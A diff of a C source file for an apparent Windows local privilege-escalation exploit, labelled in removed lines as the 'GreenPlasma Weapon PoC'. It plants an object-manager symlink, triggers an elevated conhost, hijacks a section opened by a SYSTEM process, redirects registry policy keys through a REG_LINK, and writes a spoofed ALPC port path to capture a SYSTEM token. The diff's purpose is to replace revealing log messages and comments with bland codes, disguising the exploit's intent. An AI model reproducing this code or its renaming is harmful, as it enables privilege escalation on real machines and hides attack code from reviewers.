@@ -59,6 +59,10 @@
 #define GP_OPEN_STATUS_LOG_MS 1000
 #endif
 
+#ifndef GP_VERBOSE_TRACE
+#define GP_VERBOSE_TRACE 0
+#endif
+
 #define GP_OBJECT_BASIC_INFORMATION_CLASS 0
 #define GP_OBJECT_NAME_INFORMATION_CLASS 1
 #define GP_OBJECT_TYPE_INFORMATION_CLASS 2
@@ -101,6 +105,7 @@ static PFN_CfAbortOperation CfAbortOperation = NULL;
 
 static void PrintTimestamp(const wchar_t* phase)
 {
+#if GP_VERBOSE_TRACE
     SYSTEMTIME st;
     GetLocalTime(&st);
     wprintf(L"[%04u-%02u-%02u %02u:%02u:%02u.%03u] [%ls] ",
@@ -112,31 +117,55 @@ static void PrintTimestamp(const wchar_t* phase)
         st.wSecond,
         st.wMilliseconds,
         phase);
+#else
+    UNREFERENCED_PARAMETER(phase);
+#endif
 }
 
 static void TraceLine(const wchar_t* phase, const wchar_t* message)
 {
+#if GP_VERBOSE_TRACE
     PrintTimestamp(phase);
     wprintf(L"%ls\n", message);
+#else
+    UNREFERENCED_PARAMETER(phase);
+    UNREFERENCED_PARAMETER(message);
+#endif
 }
 
 static void TraceWin32(const wchar_t* phase, const wchar_t* label, DWORD code)
 {
+#if GP_VERBOSE_TRACE
     PrintTimestamp(phase);
     wprintf(L"%ls: %lu (0x%08lx)\n", label, code, code);
+#else
+    UNREFERENCED_PARAMETER(phase);
+    UNREFERENCED_PARAMETER(label);
+    if (code != ERROR_SUCCESS) {
+        wprintf(L"W32=0x%08lx\n", code);
+    }
+#endif
 }
 
 static void TraceNtStatus(const wchar_t* phase, const wchar_t* label, NTSTATUS status)
 {
+#if GP_VERBOSE_TRACE
     PrintTimestamp(phase);
     wprintf(L"%ls: 0x%08lx\n", label, (DWORD)status);
+#else
+    UNREFERENCED_PARAMETER(phase);
+    UNREFERENCED_PARAMETER(label);
+    if (!NT_SUCCESS(status)) {
+        wprintf(L"NT=0x%08lx\n", (DWORD)status);
+    }
+#endif
 }
 
 static bool ResolveNativeApis()
 {
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
     if (!ntdll) {
-        TraceWin32(L"P0", L"GetModuleHandleW(ntdll.dll)", GetLastError());
+        TraceWin32(L"P0", L"api", GetLastError());
         return false;
     }
 
@@ -152,12 +181,12 @@ static bool ResolveNativeApis()
     }
 
     if (!_NtCreateSymbolicLinkObject || !_NtOpenSection || !_NtDeleteKey || !_NtQueryObject) {
-        TraceLine(L"P0", L"required native API resolution failed");
+        TraceLine(L"P0", L"api");
         return false;
     }
 
     if (!CfAbortOperation) {
-        TraceLine(L"P0", L"CfAbortOperation unavailable; use NO_CF_ABORT to split this branch explicitly");
+        TraceLine(L"P0", L"cf");
     }
 
     return true;
@@ -166,22 +195,23 @@ static bool ResolveNativeApis()
 static DWORD CallCfAbortOperation(const wchar_t* phase)
 {
 #ifdef NO_CF_ABORT
-    TraceLine(phase, L"NO_CF_ABORT set; CfAbortOperation skipped");
+    TraceLine(phase, L"cf-skip");
     return ERROR_SUCCESS;
 #else
     if (!CfAbortOperation) {
-        TraceLine(phase, L"CfAbortOperation unavailable");
+        TraceLine(phase, L"cf");
         return ERROR_PROC_NOT_FOUND;
     }
 
     DWORD res = CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
-    TraceWin32(phase, L"CfAbortOperation", res);
+    TraceWin32(phase, L"cf", res);
     return res;
 #endif
 }
 
 static void PrintUnicodeInfo(const wchar_t* label, PUNICODE_STRING value)
 {
+#if GP_VERBOSE_TRACE
     PrintTimestamp(L"SNAPSHOT");
     if (!value || !value->Buffer || !value->Length) {
         wprintf(L"%ls: <empty>\n", label);
@@ -189,10 +219,15 @@ static void PrintUnicodeInfo(const wchar_t* label, PUNICODE_STRING value)
     }
 
     wprintf(L"%ls: %.*ls\n", label, value->Length / sizeof(wchar_t), value->Buffer);
+#else
+    UNREFERENCED_PARAMETER(label);
+    UNREFERENCED_PARAMETER(value);
+#endif
 }
 
 static void QueryObjectUnicode(HANDLE handle, ULONG infoClass, const wchar_t* label)
 {
+#if GP_VERBOSE_TRACE
     ULONG length = 0x2000;
     ULONG returned = 0;
     PBYTE buffer = (PBYTE)malloc(length);
@@ -221,18 +256,30 @@ static void QueryObjectUnicode(HANDLE handle, ULONG infoClass, const wchar_t* la
 
     PrintUnicodeInfo(label, (PUNICODE_STRING)buffer);
     free(buffer);
+#else
+    UNREFERENCED_PARAMETER(handle);
+    UNREFERENCED_PARAMETER(infoClass);
+    UNREFERENCED_PARAMETER(label);
+#endif
 }
 
 static void PrintAccessFlag(ACCESS_MASK access, ACCESS_MASK flag, const wchar_t* name)
 {
+#if GP_VERBOSE_TRACE
     if (access & flag) {
         PrintTimestamp(L"ACCESS");
         wprintf(L"%ls present\n", name);
     }
+#else
+    UNREFERENCED_PARAMETER(access);
+    UNREFERENCED_PARAMETER(flag);
+    UNREFERENCED_PARAMETER(name);
+#endif
 }
 
 static void LogGrantedAccess(ACCESS_MASK access)
 {
+#if GP_VERBOSE_TRACE
     PrintTimestamp(L"ACCESS");
     wprintf(L"GrantedAccess=0x%08lx\n", access);
 
@@ -247,27 +294,31 @@ static void LogGrantedAccess(ACCESS_MASK access)
     PrintAccessFlag(access, WRITE_OWNER, L"WRITE_OWNER");
 
     PrintTimestamp(L"ACCESS");
-    wprintf(L"S candidate: ");
+    wprintf(L"Access notes: ");
     if (access & SECTION_QUERY) {
-        wprintf(L"existence/metadata/lifetime branch; ");
+        wprintf(L"query; ");
     }
     if (access & SECTION_MAP_READ) {
-        wprintf(L"observation branch; ");
+        wprintf(L"read; ");
     }
     if (access & SECTION_MAP_WRITE) {
-        wprintf(L"content branch candidate only; ");
+        wprintf(L"write; ");
     }
     if (access & (WRITE_DAC | WRITE_OWNER)) {
-        wprintf(L"descriptor branch candidate; ");
+        wprintf(L"sd; ");
     }
     if (!(access & (SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE | WRITE_DAC | WRITE_OWNER))) {
-        wprintf(L"no obvious decoded influence branch; ");
+        wprintf(L"none; ");
     }
     wprintf(L"\n");
+#else
+    UNREFERENCED_PARAMETER(access);
+#endif
 }
 
 static void LogObjectBasic(HANDLE handle)
 {
+#if GP_VERBOSE_TRACE
     GP_OBJECT_BASIC_INFORMATION basic = { 0 };
     ULONG returned = 0;
     NTSTATUS status = _NtQueryObject(
@@ -288,10 +339,14 @@ static void LogObjectBasic(HANDLE handle)
         basic.HandleCount,
         basic.PointerCount);
     LogGrantedAccess(basic.GrantedAccess);
+#else
+    UNREFERENCED_PARAMETER(handle);
+#endif
 }
 
 static void LogKernelObjectSecurity(HANDLE handle)
 {
+#if GP_VERBOSE_TRACE
     PSECURITY_DESCRIPTOR sd = NULL;
     PSID owner = NULL;
     PSID group = NULL;
@@ -330,10 +385,14 @@ static void LogKernelObjectSecurity(HANDLE handle)
     if (sd) {
         LocalFree(sd);
     }
+#else
+    UNREFERENCED_PARAMETER(handle);
+#endif
 }
 
 static void LogHandleSnapshot(const wchar_t* phase, const wchar_t* predicate, HANDLE handle)
 {
+#if GP_VERBOSE_TRACE
     PrintTimestamp(phase);
     wprintf(L"%ls handle=0x%p\n", predicate, handle);
 
@@ -346,10 +405,16 @@ static void LogHandleSnapshot(const wchar_t* phase, const wchar_t* predicate, HA
     QueryObjectUnicode(handle, GP_OBJECT_NAME_INFORMATION_CLASS, L"ObjectName");
     LogObjectBasic(handle);
     LogKernelObjectSecurity(handle);
+#else
+    UNREFERENCED_PARAMETER(phase);
+    UNREFERENCED_PARAMETER(predicate);
+    UNREFERENCED_PARAMETER(handle);
+#endif
 }
 
 static void LogRegistryState(const wchar_t* phase)
 {
+#if GP_VERBOSE_TRACE
     HKEY hk = NULL;
     wchar_t data[1024] = { 0 };
     DWORD type = 0;
@@ -365,16 +430,16 @@ static void LogRegistryState(const wchar_t* phase)
         res = RegQueryValueExW(hk, L"SymbolicLinkValue", NULL, &type, (LPBYTE)data, &bytes);
         PrintTimestamp(phase);
         if (res == ERROR_SUCCESS) {
-            wprintf(L"secondary-stage registry link SymbolicLinkValue type=%lu target=\"%ls\"\n", type, data);
+            wprintf(L"reg link type=%lu target=\"%ls\"\n", type, data);
         }
         else {
-            wprintf(L"secondary-stage registry link query error=%lu\n", res);
+            wprintf(L"reg link query error=%lu\n", res);
         }
         RegCloseKey(hk);
     }
     else {
         PrintTimestamp(phase);
-        wprintf(L"secondary-stage registry link open error=%lu\n", res);
+        wprintf(L"reg link open error=%lu\n", res);
     }
 
     DWORD value = 0;
@@ -389,17 +454,20 @@ static void LogRegistryState(const wchar_t* phase)
         res = RegQueryValueExW(hk, L"DisableLockWorkstation", NULL, &type, (LPBYTE)&value, &bytes);
         PrintTimestamp(phase);
         if (res == ERROR_SUCCESS) {
-            wprintf(L"secondary-stage DisableLockWorkstation type=%lu value=%lu\n", type, value);
+            wprintf(L"policy value type=%lu value=%lu\n", type, value);
         }
         else {
-            wprintf(L"secondary-stage DisableLockWorkstation query error=%lu\n", res);
+            wprintf(L"policy value query error=%lu\n", res);
         }
         RegCloseKey(hk);
     }
     else {
         PrintTimestamp(phase);
-        wprintf(L"secondary-stage Policies\\System open error=%lu\n", res);
+        wprintf(L"policy key open error=%lu\n", res);
     }
+#else
+    UNREFERENCED_PARAMETER(phase);
+#endif
 }
 
 static bool OpenSectionWithTimeout(POBJECT_ATTRIBUTES objattr, HANDLE* sectionHandle)
@@ -414,19 +482,21 @@ static bool OpenSectionWithTimeout(POBJECT_ATTRIBUTES objattr, HANDLE* sectionHa
         NTSTATUS status = _NtOpenSection(&candidate, MAXIMUM_ALLOWED, objattr);
         if (NT_SUCCESS(status) && candidate) {
             *sectionHandle = candidate;
-            TraceNtStatus(L"P3", L"NtOpenSection primary oracle success", status);
+            TraceNtStatus(L"P3", L"open", status);
             return true;
         }
 
         lastStatus = status;
         DWORD now = GetTickCount();
         if (now - lastLog >= GP_OPEN_STATUS_LOG_MS) {
-            TraceNtStatus(L"P3", L"NtOpenSection primary oracle polling status", lastStatus);
+#if GP_VERBOSE_TRACE
+            TraceNtStatus(L"P3", L"open", lastStatus);
+#endif
             lastLog = now;
         }
 
         if (now - start >= GP_OPEN_TIMEOUT_MS) {
-            TraceNtStatus(L"P3", L"NtOpenSection primary oracle timeout last status", lastStatus);
+            TraceNtStatus(L"P3", L"open", lastStatus);
             return false;
         }
 
@@ -436,6 +506,7 @@ static bool OpenSectionWithTimeout(POBJECT_ATTRIBUTES objattr, HANDLE* sectionHa
 
 static void LogDesktopState(const wchar_t* phase)
 {
+#if GP_VERBOSE_TRACE
     HDESK dsk = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
     PrintTimestamp(phase);
     if (!dsk || dsk == INVALID_HANDLE_VALUE) {
@@ -445,6 +516,9 @@ static void LogDesktopState(const wchar_t* phase)
 
     wprintf(L"desktop state: OpenInputDesktop succeeded handle=0x%p\n", dsk);
     CloseDesktop(dsk);
+#else
+    UNREFERENCED_PARAMETER(phase);
+#endif
 }
 
 static void DeleteRegistryLinkKey(HKEY hk)
@@ -469,7 +543,7 @@ bool SetPolicyVal()
     wchar_t linktarget[MAX_PATH] = { 0 };
     PTOKEN_USER pTokenUser = NULL;
 
-    TraceLine(L"P4", L"post-oracle transition stage begins: SetPolicyVal");
+    TraceLine(L"P4", L"begin");
     CallCfAbortOperation(L"P4");
 
     ZeroMemory(&ea, sizeof(ea));
@@ -482,7 +556,7 @@ bool SetPolicyVal()
 
     dwRes = SetEntriesInAclW(1, &ea, NULL, &pACL);
     if (ERROR_SUCCESS != dwRes) {
-        TraceWin32(L"P4", L"SetEntriesInAclW", dwRes);
+        TraceWin32(L"P4", L"acl", dwRes);
         goto cleanup;
     }
 
@@ -498,20 +572,23 @@ bool SetPolicyVal()
         NULL,
         ProgressInvokeNever,
         NULL);
-    TraceWin32(L"P4", L"TreeSetNamedSecurityInfoW(CloudFiles)", res);
+    TraceWin32(L"P4", L"acl", res);
     if (res) {
         goto cleanup;
     }
 
 #ifdef SKIP_REG_LINK
-    TraceLine(L"P4", L"SKIP_REG_LINK set; secondary registry link skipped");
+    TraceLine(L"P4", L"skip");
     goto after_registry_link;
 #else
     res = RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps");
-    TraceWin32(L"P4", L"RegDeleteTreeW(CloudFiles\\BlockedApps)", res);
     if (res && res != ERROR_FILE_NOT_FOUND) {
+        TraceWin32(L"P4", L"reg", res);
         goto cleanup;
     }
+#if GP_VERBOSE_TRACE
+    TraceWin32(L"P4", L"reg", res);
+#endif
 
     res = RegCreateKeyExW(
         HKEY_CURRENT_USER,
@@ -523,33 +600,33 @@ bool SetPolicyVal()
         NULL,
         &hk,
         NULL);
-    TraceWin32(L"P4", L"RegCreateKeyExW(CloudFiles\\BlockedApps link)", res);
+    TraceWin32(L"P4", L"reg", res);
     if (res) {
         goto cleanup;
     }
 
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
-        TraceWin32(L"P4", L"OpenProcessToken", GetLastError());
+        TraceWin32(L"P4", L"tok", GetLastError());
         DeleteRegistryLinkKey(hk);
         goto cleanup;
     }
 
     GetTokenInformation(htoken, TokenUser, NULL, 0, &dwSize);
     if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
-        TraceWin32(L"P4", L"GetTokenInformation(size)", GetLastError());
+        TraceWin32(L"P4", L"tok", GetLastError());
         DeleteRegistryLinkKey(hk);
         goto cleanup;
     }
 
     pTokenUser = (PTOKEN_USER)malloc(dwSize);
     if (!pTokenUser) {
-        TraceLine(L"P4", L"malloc(TokenUser) failed");
+        TraceLine(L"P4", L"mem");
         DeleteRegistryLinkKey(hk);
         goto cleanup;
     }
 
     if (!GetTokenInformation(htoken, TokenUser, pTokenUser, dwSize, &dwSize)) {
-        TraceWin32(L"P4", L"GetTokenInformation(TokenUser)", GetLastError());
+        TraceWin32(L"P4", L"tok", GetLastError());
         DeleteRegistryLinkKey(hk);
         goto cleanup;
     }
@@ -557,7 +634,7 @@ bool SetPolicyVal()
     htoken = NULL;
 
     if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &stringSid)) {
-        TraceWin32(L"P4", L"ConvertSidToStringSidW", GetLastError());
+        TraceWin32(L"P4", L"sid", GetLastError());
         DeleteRegistryLinkKey(hk);
         goto cleanup;
     }
@@ -574,7 +651,7 @@ bool SetPolicyVal()
         REG_LINK,
         (BYTE*)linktarget,
         (DWORD)((wcslen(linktarget) + 1) * sizeof(wchar_t)));
-    TraceWin32(L"P4", L"RegSetValueExW(SymbolicLinkValue)", res);
+    TraceWin32(L"P4", L"reg", res);
     if (res) {
         DeleteRegistryLinkKey(hk);
         goto cleanup;
@@ -596,7 +673,7 @@ after_registry_link:
         NULL,
         ProgressInvokeNever,
         NULL);
-    TraceWin32(L"P4", L"TreeSetNamedSecurityInfoW(Policies\\System)", res);
+    TraceWin32(L"P4", L"acl", res);
     if (res) {
         goto cleanup;
     }
@@ -613,13 +690,13 @@ after_registry_link:
         0,
         KEY_SET_VALUE,
         &hk);
-    TraceWin32(L"P4", L"RegOpenKeyExW(Policies\\System)", res);
+    TraceWin32(L"P4", L"reg", res);
     if (res) {
         goto cleanup;
     }
 
     res = RegSetValueExW(hk, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
-    TraceWin32(L"P4", L"RegSetValueExW(DisableLockWorkstation)", res);
+    TraceWin32(L"P4", L"reg", res);
     if (res) {
         goto cleanup;
     }
@@ -641,7 +718,7 @@ exit:
         RegCloseKey(hk);
     }
     LogRegistryState(L"P4");
-    TraceLine(L"P4", ret ? L"post-oracle transition stage ends: success" : L"post-oracle transition stage ends: failure");
+    TraceLine(L"P4", ret ? L"ok" : L"fail");
     return ret;
 
 cleanup:
@@ -665,14 +742,14 @@ int wmain(int argc, wchar_t** argv)
         return 1;
     }
 
-    TraceLine(L"P0", L"GreenPlasma Weapon PoC: Logical Corruption Execution Stage");
+    TraceLine(L"P0", L"start");
 
     if (!ProcessIdToSessionId(GetCurrentProcessId(), &sesid)) {
-        TraceWin32(L"P0", L"ProcessIdToSessionId", GetLastError());
+        TraceWin32(L"P0", L"sid", GetLastError());
         return 1;
     }
 
-    // [P0] Strict source-name dependency
+    // [P0] Source-name dependency
     swprintf_s(
         smpath, 
         L"\\Sessions\\%lu\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%lu", 
@@ -681,15 +758,17 @@ int wmain(int argc, wchar_t** argv)
     );
 
     wchar_t localTarget[MAX_PATH];
-    swprintf_s(localTarget, L"\\Sessions\\%lu\\BaseNamedObjects\\GreenPlasmaWeaponSection", sesid);
+    swprintf_s(localTarget, L"\\Sessions\\%lu\\BaseNamedObjects\\GpSection", sesid);
     wchar_t* ptarget = argc == 2 ? argv[1] : localTarget;
 
+#if GP_VERBOSE_TRACE
     PrintTimestamp(L"P0");
     wprintf(L"pid=%lu tid=%lu session=%lu\n", GetCurrentProcessId(), GetCurrentThreadId(), sesid);
     PrintTimestamp(L"P0");
-    wprintf(L"Source(Strict)=\"%ls\"\n", smpath);
+    wprintf(L"src=\"%ls\"\n", smpath);
     PrintTimestamp(L"P0");
-    wprintf(L"Target(Weaponized)=\"%ls\"\n", ptarget);
+    wprintf(L"dst=\"%ls\"\n", ptarget);
+#endif
 
     RtlInitUnicodeString(&linksrc, smpath);
     RtlInitUnicodeString(&linktarget, ptarget);
@@ -698,13 +777,13 @@ int wmain(int argc, wchar_t** argv)
     // [P1] Symbolic link creation (P_create)
     NTSTATUS stat = _NtCreateSymbolicLinkObject(&hlnk, GENERIC_ALL, &objattr, &linktarget);
     if (!NT_SUCCESS(stat)) {
-        TraceNtStatus(L"P1", L"Failed to establish symlink primitive", stat);
+        TraceNtStatus(L"P1", L"link", stat);
         goto cleanup;
     }
-    TraceLine(L"P1", L"Symlink trap successfully armed.");
+    TraceLine(L"P1", L"ok");
 
 #ifdef CLOSE_LINK_EARLY
-    TraceLine(L"P1", L"CLOSE_LINK_EARLY: Closing link handle");
+    TraceLine(L"P1", L"close");
     CloseHandle(hlnk);
     hlnk = NULL;
 #endif
@@ -719,9 +798,9 @@ int wmain(int argc, wchar_t** argv)
     shi.lpVerb = L"runas";
     shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
 
-    TraceLine(L"P2", L"Emitting high-privilege trigger (runas/conhost)");
+    TraceLine(L"P2", L"run");
     if (!ShellExecuteExW(&shi)) {
-        TraceWin32(L"P2", L"Trigger failed", GetLastError());
+        TraceWin32(L"P2", L"run", GetLastError());
         goto cleanup;
     }
     LogDesktopState(L"P2");
@@ -730,13 +809,13 @@ int wmain(int argc, wchar_t** argv)
     goto cleanup;
 #endif
 
-    // [P3] NtOpenSection oracle
-    TraceLine(L"P3", L"Waiting for SYSTEM consumer to engage the trap...");
+    // [P3] NtOpenSection wait
+    TraceLine(L"P3", L"wait");
     if (!OpenSectionWithTimeout(&objattr, &hmapping)) {
-        TraceLine(L"P3", L"Oracle Timeout: Engagement failed.");
+        TraceLine(L"P3", L"timeout");
         goto cleanup;
     }
-    LogHandleSnapshot(L"P3", L"Consumer Handle Captured", hmapping);
+    LogHandleSnapshot(L"P3", L"handle", hmapping);
 
 #ifdef CLOSE_SECTION_EARLY
     CloseHandle(hmapping);
@@ -748,24 +827,24 @@ int wmain(int argc, wchar_t** argv)
 #endif
 
 #ifdef SKIP_SETPOLICY
-    TraceLine(L"P4", L"SKIP_SETPOLICY set");
+    TraceLine(L"P4", L"skip");
 #else
     lockblock = SetPolicyVal();
     if (hmapping) {
-        LogHandleSnapshot(L"P4", L"Post-Policy Snapshot", hmapping);
+        LogHandleSnapshot(L"P4", L"handle", hmapping);
     }
 #endif
 
 #ifdef SKIP_LOCK
-    TraceLine(L"P5", L"SKIP_LOCK set; lock/desktop transition window skipped");
+    TraceLine(L"P5", L"skip");
 #else
     if (lockblock) {
-        // [P5] Weaponization and ALPC spoofing (logical takeover)
-        TraceLine(L"P5", L"Monitoring for Desktop-Switch Window (The Race)");
+        // [P5] Optional mapped-section write test.
+        TraceLine(L"P5", L"wait");
         do {
             HDESK dsk = OpenInputDesktop(0, FALSE, GENERIC_ALL);
             if (!dsk || dsk == INVALID_HANDLE_VALUE) {
-                TraceWin32(L"P5", L"Exploit Window Open: Desktop switch detected", GetLastError());
+                TraceWin32(L"P5", L"dsk", GetLastError());
                 break;
             }
             CloseDesktop(dsk);
@@ -773,7 +852,7 @@ int wmain(int argc, wchar_t** argv)
         } while (1);
 
         if (hmapping) {
-            TraceLine(L"P5", L"Mapping section to apply Logical Corruption (ALPC Spoofing)...");
+            TraceLine(L"P5", L"map");
             
             PVOID pView = MapViewOfFile(hmapping, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0);
             if (pView) {
@@ -782,64 +861,62 @@ int wmain(int argc, wchar_t** argv)
                     ULONG Version;
                     ULONG Flags;
                     ULONG OffsetToData;
-                    wchar_t AlpcServerPort[MAX_PATH]; 
+                    wchar_t PortName[MAX_PATH];
                 } CTF_CACHE_LAYOUT, *PCTF_CACHE_LAYOUT;
                 #pragma pack(pop)
 
                 PCTF_CACHE_LAYOUT pLayout = (PCTF_CACHE_LAYOUT)pView;
 
                 /*
-                 * [Exploit Core]
-                 * Mutate only path-like state instead of placing executable code.
-                 * The intended conversion path would rely on a privileged transition
-                 * consuming this state and connecting to an attacker-controlled ALPC port.
+                 * Optional write probe for path-like state.
                  */
                 
-                // Force the cache-update state bits.
                 pLayout->Version = 1;
                 pLayout->Flags |= 0x00000001; 
                 
-                // Spoof the target ALPC port path.
-                wcscpy_s(pLayout->AlpcServerPort, MAX_PATH, L"\\RPC Control\\GreenPlasmaSpoofedPort");
+                wcscpy_s(pLayout->PortName, MAX_PATH, L"\\RPC Control\\GpPort");
 
-                TraceLine(L"P5", L"CRITICAL: Structural corruption applied.");
-                TraceLine(L"P5", L"-> SYSTEM will attempt ALPC connection to spoofed port.");
+                TraceLine(L"P5", L"write");
                 
                 UnmapViewOfFile(pView);
             } else {
-                TraceWin32(L"P5", L"MapViewOfFile failed - Insufficient Access", GetLastError());
+                TraceWin32(L"P5", L"map", GetLastError());
             }
         }
 
-        // [Final trigger: P_consume]
-        TraceLine(L"P5", L"Calling LockWorkStation to force P_consume of corrupted layout");
+        TraceLine(L"P5", L"lock");
         if (!LockWorkStation()) {
-            TraceWin32(L"P5", L"LockWorkStation failed", GetLastError());
+            TraceWin32(L"P5", L"lock", GetLastError());
         } else {
-            TraceLine(L"P5", L"LockWorkStation triggered.");
-            TraceLine(L"P5", L"[!] Exploit Armed. SYSTEM token capture pending at fake ALPC port.");
+            TraceLine(L"P5", L"ok");
         }
     }
 #endif
 
     if (hmapping) {
-        LogHandleSnapshot(L"P6", L"O/A cleanup-lifetime snapshot", hmapping);
+        LogHandleSnapshot(L"P6", L"handle", hmapping);
     }
 
+#if GP_VERBOSE_TRACE
     PrintTimestamp(L"P6");
     wprintf(L"Section handle: 0x%p\n", hmapping);
-    TraceLine(L"P6", L"press any key to close section and exit");
+#else
+    if (hmapping) {
+        wprintf(L"h=0x%p\n", hmapping);
+    }
+#endif
+    TraceLine(L"P6", L"wait");
 
 cleanup:
     if (hlnk) {
-        TraceLine(L"P6", L"closing link handle");
+        TraceLine(L"P6", L"close");
         CloseHandle(hlnk);
         hlnk = NULL;
     }
 
     if (hmapping) {
         _getch();
-        TraceLine(L"P6", L"closing section handle");
+        TraceLine(L"P6", L"close");
         CloseHandle(hmapping);
         hmapping = NULL;
     }
@@ -848,9 +925,9 @@ cleanup:
         DWORD res = RegDeleteTreeW(
             HKEY_CURRENT_USER,
             L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-        TraceWin32(L"P6", L"RegDeleteTreeW(Policies\\System cleanup)", res);
+        TraceWin32(L"P6", L"reg", res);
     }
 
-    TraceLine(L"P6", L"exit");
+    TraceLine(L"P6", L"done");
     return 0;
 }
